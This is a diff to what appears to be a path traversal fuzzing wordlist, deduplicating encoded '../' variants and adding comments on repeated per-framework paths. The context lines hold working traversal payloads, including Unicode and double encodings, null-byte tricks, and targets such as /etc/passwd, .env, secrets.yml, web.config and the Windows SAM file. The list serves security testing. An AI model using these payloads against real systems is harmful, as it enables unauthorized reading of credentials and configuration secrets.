@@ -19,8 +19,6 @@
 # Double URL encoded
 ..%252F
 ..%252F..%252F
-..%c0%af
-..%c1%9c
 
 # Windows paths
 ..\
@@ -57,9 +55,7 @@
 ../../../application.properties
 
 # Advanced encoding techniques
-..%c0%af
 ..%c1%9c
-..%e0%80%af
 ..%f0%80%80%af
 ..%c0%2f
 ..%c0%5c
@@ -71,8 +67,6 @@
 ..%uF025
 
 # 16-bit Unicode
-..%c0%af
-..%c1%9c
 %c0%ae%c0%ae/
 %c0%ae%c0%ae%c0%af
 
@@ -87,7 +81,6 @@
 ..%c0%2e%c0%2e%c0%2f
 
 # Backslash variations
-..\
 ..\..
 ..\\
 ..\\..\\
@@ -147,7 +140,6 @@ C:\inetpub\wwwroot\web.config
 ..;//..;//
 
 # Null byte variations
-../../../etc/passwd%00
 ../../../etc/passwd%00.png
 ../../../etc/passwd\x00
 ../../../etc/passwd\0
@@ -174,6 +166,7 @@ C:\inetpub\wwwroot\web.config
 
 # Framework-specific files
 # Laravel
+# Same path, repeated for this stack.
 ../../../.env
 ../../../storage/logs/laravel.log
 ../../../config/database.php
@@ -190,21 +183,25 @@ C:\inetpub\wwwroot\web.config
 ../../../db.sqlite3
 
 # Spring Boot
+# Same path, repeated for this stack.
 ../../../application.properties
 ../../../application.yml
 ../../../application-prod.properties
 
 # Ruby on Rails
+# Same path, repeated for this stack.
 ../../../config/database.yml
 ../../../config/secrets.yml
 ../../../Gemfile
 
 # Node.js/Express
 ../../../package.json
+# Same path, repeated for this stack.
 ../../../.env
 ../../../config/default.json
 
 # ASP.NET
+# Same path, repeated for this stack.
 ../../../web.config
 ../../../Web.config
 ../../../appsettings.json
@@ -341,7 +338,6 @@ Referer: ../../../etc/passwd
 \\\\127.0.0.1\\C$\\Windows\\System32\\config\\SAM
 
 # Mac/Linux specific
-../../../etc/passwd
 ../../../etc/master.passwd
 ../../../private/etc/master.passwd
 ../../../Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist
